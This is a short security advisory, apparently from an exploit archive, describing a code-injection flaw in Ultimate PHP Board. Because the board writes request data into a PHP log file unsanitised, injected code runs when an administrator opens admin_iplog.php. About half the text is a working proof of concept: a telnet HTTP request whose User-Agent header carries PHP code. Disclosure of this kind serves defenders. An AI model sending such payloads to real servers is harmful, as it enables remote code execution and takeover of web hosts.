@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/7678/info
+
+A vulnerability has been reported in Ultimate PHP Board. The problem is said to occur due to insufficient sanitization of user-supplied input before including log data into a PHP file. As a result, it may be possible for a remote attacker to execute arbitrary PHP commands within the context of the web server. The execution of these commands would only occur when an administrator chooses to view the log of forum activity via the 'admin_iplog.php' script. 
+
+$ telnet www.target.org 80
+Connected to www.target.org at 80
+GET /board/index.php HTTP/1.0
+User-Agent: <? phpinfo(); ?> 
